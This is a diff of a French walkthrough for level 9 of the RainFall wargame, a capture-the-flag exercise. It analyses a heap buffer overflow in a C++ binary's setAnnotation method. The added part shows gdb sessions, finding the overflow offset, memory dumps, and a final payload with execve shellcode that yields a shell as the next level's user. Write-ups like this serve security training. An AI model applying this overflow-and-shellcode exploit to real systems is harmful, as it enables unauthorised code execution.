@@ -1,96 +1,24 @@
 # level 9
-
-
-
-Voici le code decompilé avec dogBolt (ghidra)
-```
-void main(int param_1,int param_2)
-{
-  N *this;
-  undefined4 *this_00;
-  if (param_1 < 2) {
-                    // WARNING: Subroutine does not return
-    _exit(1);
-  }
-  this = (N *)operator_new(0x6c);
-  N::N(this,5);
-  this_00 = (undefined4 *)operator_new(0x6c);
-  N::N((N *)this_00,6);
-  N::setAnnotation(this,*(char **)(param_2 + 4));
-  (**(code **)*this_00)(this_00,this);
-  return;
-}
-
-// N::N(int)
-void __thiscall N::N(N *this,int param_1)
-
-{
-  *(undefined ***)this = &PTR_operator__08048848;
-  *(int *)(this + 0x68) = param_1;
-  return;
-}
-
-
-void __thiscall N::setAnnotation(N *this,char *param_1)
-{
-  size_t __n;
-
-  __n = strlen(param_1);
-  memcpy(this + 4,param_1,__n);
-  return;
-}
-
-int __thiscall N::operator+(N *this,N *param_1)
-
-{
-  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
-}
-
-int __thiscall N::operator-(N *this,N *param_1)
-
-{
-  return *(int *)(this + 0x68) - *(int *)(param_1 + 0x68);
-}
-```
-
-
-Le programme fourni semble implémenter un certain nombre de fonctionnalités C++ manipulant des objets de type N. Voici une explication détaillée de chacune des parties du programme :
+Voici une explication détaillée de chacune des parties du programme C++:
 
 ## Fonction main
 La fonction principale du programme commence par vérifier si au moins un argument a été passé en ligne de commande (en excluant le nom du programme lui-même). Si ce n'est pas le cas, elle appelle _exit(1).
 
-- param_1 représente le nombre d'arguments (argc).
-- param_2 est un pointeur vers un tableau de chaînes de caractères (argv).
-
 ## Allocation et Initialisation des Objets N
 Deux objets de type N sont créés et initialisés :
 
-- this : Premier objet, alloué avec operator_new(0x6c) et initialisé avec une valeur de 5.
-- this_00 : Deuxième objet, également alloué avec operator_new(0x6c) et initialisé avec une valeur de 6.
+- Premier objet initialisé avec une valeur de 5.
+- Deuxième objet initialisé avec une valeur de 6.
 
-Après leur création, la fonction setAnnotation est appelée sur le premier objet this en passant le premier argument de ligne de commande (argv[1]). Cette méthode est utilisée pour définir une donnée membre de l'objet en copiant la chaîne de caractères passée en argument dans l'objet.
+Après leur création, la fonction setAnnotation est appelée sur le premier objet this en passant le premier argument de ligne de commande (argv[1]).
 
-Ensuite, il y a un appel indirect de fonction via le deuxième objet this_00, qui semble utiliser un pointeur de fonction stocké dans ou avec l'objet (impliquant peut-être une table de méthodes virtuelles ou un comportement similaire).
-
-## Classe N et ses Méthodes
-Constructeur N::N(int)
-Ce constructeur initialise les objets de type N :
-
-- Il configure un pointeur (probablement un pointeur de table virtuelle) à une adresse fixe.
-- Il stocke la valeur param_1 à un emplacement spécifique de l'objet (this + 0x68).
-
-## Méthode setAnnotation(char*)
 Cette méthode copie une chaîne de caractères dans l'objet, en commençant juste après le début de l'objet (à l'adresse this + 4). La longueur de la chaîne est déterminée par strlen, et il n'y a aucune vérification pour prévenir un dépassement de la taille allouée pour l'objet, ce qui représente une vulnérabilité de débordement de tampon.
 
-## Surcharge des opérateurs + et -
-Ces méthodes permettent l'addition et la soustraction des valeurs stockées dans les objets N. Elles accèdent directement à un entier stocké dans une position fixe de l'objet (this + 0x68) et effectuent l'opération demandée.
-
-## Exploitation Potentielle
-La vulnérabilité ici est l'utilisation non sécurisée de memcpy dans setAnnotation, qui permet un débordement de tampon si une chaîne trop longue est passée en argument. Cela peut être exploité pour écraser des données critiques du programme, y compris des pointeurs de fonction, permettant potentiellement l'exécution de code arbitraire.
-
+Ensuite, il y a un appel indirect de fonction via le deuxième objet this_00, qui semble utiliser un pointeur de fonction stocké dans ou avec l'objet.
 
 ## Detail de l'exploit
 
+La vulnérabilité ici est l'utilisation non sécurisée de memcpy dans setAnnotation.
 Nous allons mettre un breakpoint apres setAnnotation dans gdb et utiliser un script python qui ecris "aaaabbbb....YYYYZZZZ" dans la sortie. Ce qui nous permettra de voir ou nous pourrons ecraser les adresses de retour, et reorienter le code.
 
 ```
@@ -174,12 +102,69 @@ eax            0x42424242       1111638594
 ecx            0x5a5a5a5a       1515870810
 ```
 
-Nous constatons que eax pointait a l'adresse 0x804a00c puis 0x42424242 apres continuation.
-Nous allons donc creer le payload suivant qui redirige le programme a l'adresse 0x804a00c et a cette adresse nous mettons l'adresse 0x804a018 pour rediriger dans notre nodSled et glisser jusqu'a notre shellcode.
-
-Apres de nombreux tests d'alignement de memoire, voici le payload final.
 ```
-level9@RainFall:~$ ./level9 $(python -c 'print "\x18\xa0\x04\x08" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A"*(108 - 30 - 23 -5) + "\x0c\xa0\x04\x08"')
+./level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+level9@RainFall:~$ dmesg | grep segfault
+[52806.555838] level9[11797]: segfault at 62626262 ip 08048682 sp bffff650 error 4 in level9[8048000+1000]
+```
+
+Le programme segfault a l'adresse 62626262 (bbbb), l'offset est donc de 128.
+Nous n'avons plus qu'a trouver l'adresse du buffer, injecter notre shellcode, et sauter au debut du buffer.
+
+Testons dans gdb :
+```
+(gdb) info functions
+0x0804870e  N::setAnnotation(char*)
+
+(gdb) disas 0x0804870e
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:     push   %ebp
+   0x0804870f <+1>:     mov    %esp,%ebp
+   0x08048711 <+3>:     sub    $0x18,%esp
+   0x08048714 <+6>:     mov    0xc(%ebp),%eax
+   0x08048717 <+9>:     mov    %eax,(%esp)
+   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:    mov    0x8(%ebp),%edx
+   0x08048722 <+20>:    add    $0x4,%edx
+   0x08048725 <+23>:    mov    %eax,0x8(%esp)
+   0x08048729 <+27>:    mov    0xc(%ebp),%eax
+   0x0804872c <+30>:    mov    %eax,0x4(%esp)
+   0x08048730 <+34>:    mov    %edx,(%esp)
+   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:    leave                      <=== break ici
+   0x08048739 <+43>:    ret
+
+   (gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+
+   (gdb) x/100x $eax - 100
+    0x8049fa8:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x8049fb8:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x8049fc8:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x8049fd8:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x8049fe8:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x8049ff8:      0x00000000      0x00000000      0x00000000      0x00000071
+    0x804a008:      0x08048848      0x41414141      0x42424242      0x43434343  <=== buffer ici
+    0x804a018:      0x44444444      0x45454545      0x46464646      0x47474747
+    0x804a028:      0x48484848      0x49494949      0x4a4a4a4a      0x4b4b4b4b
+    0x804a038:      0x4c4c4c4c      0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f
+    0x804a048:      0x50505050      0x51515151      0x52525252      0x53535353
+    0x804a058:      0x54545454      0x55555555      0x56565656      0x57575757
+    0x804a068:      0x58585858      0x59595959      0x5a5a5a5a      0x61616161
+```
+
+```
+level9@RainFall:~$ /home/user/level9/level9 $(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A" * (108 - 30 - 24) + "\x18\xa0\x04\x08")')
+Segmentation fault (core dumped)
+
+[54510.788758] level9[11928]: segfault at 90909090 ip 90909090 sp bffff67c error 14
+```
+
+Le programme tombe dans le nopsled, mais segfault a nouveau, nous allons a l'adresse du segfault, donner l'adresse du shellcode a nouveau pour resauter une nouvelle fois dedans.
+
+Apres tests et alignements :
+
+```
+level9@RainFall:~$ /home/user/level9/level9 $(python -c 'print("\x18\xa0\x04\x08" + "\x90" * 26 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A" * (108 - 30 - 24) + "\x0c\xa0\x04\x08")')
 
 $ whoami
 bonus0
